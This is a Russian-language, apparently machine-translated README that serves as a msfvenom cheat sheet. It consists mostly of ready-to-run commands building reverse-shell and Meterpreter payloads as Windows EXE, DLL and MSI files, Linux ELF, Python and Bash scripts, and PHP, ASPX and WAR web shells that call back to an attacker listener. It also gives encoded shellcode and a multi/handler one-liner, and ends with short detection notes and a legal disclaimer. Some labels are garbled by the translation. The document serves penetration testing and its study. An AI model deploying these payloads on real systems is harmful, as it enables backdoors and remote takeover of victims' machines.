<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Полезные нагрузки">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Форматы">
</p>

<p выравнивание="центр">
  <b>💣 Основная шпаргалка по созданию отдельных полезных данных, шелл-кода и бэкдоров для Windows, Linux, macOS, Android и веб-платформ</b>
</p>

---

## 📋 Содержание

- [Обзор и архитектура полезной нагрузки](#-overview--payload-architecture)
  - [Поэтапные и бесэтапные полезные нагрузки](#staged-vs-stageless-payloads)
- [Основные флаги и параметры](#-essential-flags--options)
- [Полезные нагрузки Windows (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Полезные нагрузки Linux и Unix (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Полезные нагрузки веб-интерфейса и веб-оболочки (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [Генерация шеллкода для разработки эксплойтов (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
  - [Удаление плохих персонажей (`-b`)](#stripping-bad-characters--b)
  - [Кодировщики и множественные итерации (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
- [Быстрая настройка Metasploit Multi-Handler] (#-metasploit-multi-handler-quick-setup)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и обнаружение](#-защитные-соображения--обнаружение)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и архитектура полезной нагрузки

Сочетая классические утилиты `msfpayload` и `msfencode`, **msfvenom** генерирует двоичные исполняемые файлы, сценарии и необработанный шелл-код для эксплуатации и тестирования на проникновение.

### Поэтапные и бесэтапные полезные нагрузки
- **Поэтапно (например, `windows/x64/meterpreter/reverse_tcp`):**
  Использует косую черту между компонентами. Крошечная заглушка (этап 0) подключается обратно к прослушивателю и извлекает полную отражающую DLL (этап 1) в память. Идеально подходит для эксплойтов со строгими ограничениями длины буфера.
- **Бесступенчатый (например, `windows/x64/meterpreter_reverse_tcp`):**
  Использует подчеркивание (`_`). Вся полезная нагрузка Meterpreter находится внутри исполняемого файла или шелл-кода. Работает надежно, не полагаясь на многоэтапные сетевые подтверждения, что делает его идеальным для запуска командной строки и уклончивого сохранения.

---

## ⚙️ Основные флаги и параметры
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| Флаг | Описание |
|------|-------------|
| `-p, --payload` | Указывает используемые полезные данные (`--list payloads` для просмотра всех). |
| `-f, --format` | Формат вывода (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Кодировщик шеллкода для устранения неверных символов (`--list encoders`). |
| `-i, --iterations` | Количество проходов кодирования. |
| `-b, --bad-chars` | Символы, которых следует избегать в шеллкоде (например, `\x00\x0a\x0d`). |
| `-x, --template` | Исполняемый шаблон для внедрения полезных данных. |
| `-k, --keep` | Сохраняет нормальное выполнение шаблона в новом потоке. |
| `-o, --out` | Путь к выходному файлу. |

---

## 🪟 Полезные нагрузки Windows (EXE, DLL, MSI, PowerShell)

### Исполняемый файл обратной оболочки Windows x64 (бесступенчатый)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Исполняемый файл поэтапного обратного TCP для Windows x64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Полезная нагрузка для внедрения Windows DLL
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Установщик Windows MSI (повышение привилегий через AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Команда PowerShell в кодировке Base64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 Полезные нагрузки Linux и Unix (ELF, Python, Bash)

### Linux x64 ELF, двоичный (бесступенчатый)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Linux Standard `/bin/sh` Обратный TCP (без Meterpreter)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### Автономный сценарий обратной оболочки Python
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### Командная строка чистого Bash
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Полезные нагрузки веб-интерфейса и веб-оболочки (PHP, ASP, ASPX, JSP, WAR)

### PHP обратная оболочка Meterpreter
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### Классические ASP и ASPX (серверы IIS)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Пакет Java WAR (Веб-архив Apache Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 Генерация шеллкода для разработки эксплойтов (C, Raw, Python)

### Удаление плохих персонажей (`-b`)
Нулевые байты (`\x00`), возвраты каретки (`\r` = `\x0d`) и переводы строк (`\n` = `\x0a`) устраняют эксплойты, связанные со строковым повреждением памяти (например, переполнение стека):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### Кодеры и несколько итераций (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Быстрая настройка мультиобработчика Metasploit

Всегда перехватывайте полезную нагрузку, используя `multi/handler` Metasploit:
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ Краткая справочная таблица

| Целевая платформа | Команда |
|-----------------|---------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **Веб-оболочка PHP** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **ВОЙНА ТОМКОТОВ** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Необработанный шеллкод (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **Однострочник PowerShell**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Соображения по защите и обнаружению

1. **Обнаружение статических подписей.** Шаблоны и кодировщики Msfvenom по умолчанию (`shikata_ga_nai`) имеют хорошо известные статические сигнатуры, идентифицируемые практически каждым современным антивирусным ядром.
2. **Поведенческий мониторинг EDR:** агенты EDR отмечают порождение аномального процесса (например, `cmd.exe` или `powershell.exe`, порожденные под `w3wp.exe` или `tomcat8.exe`).

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Msfvenom генерирует функциональные наступательные полезные нагрузки и бэкдоры. Его необходимо строго использовать во время авторизованных тестов на проникновение и в изолированных лабораторных исследовательских средах. Несанкционированное создание или выполнение на сторонних компьютерах является незаконным.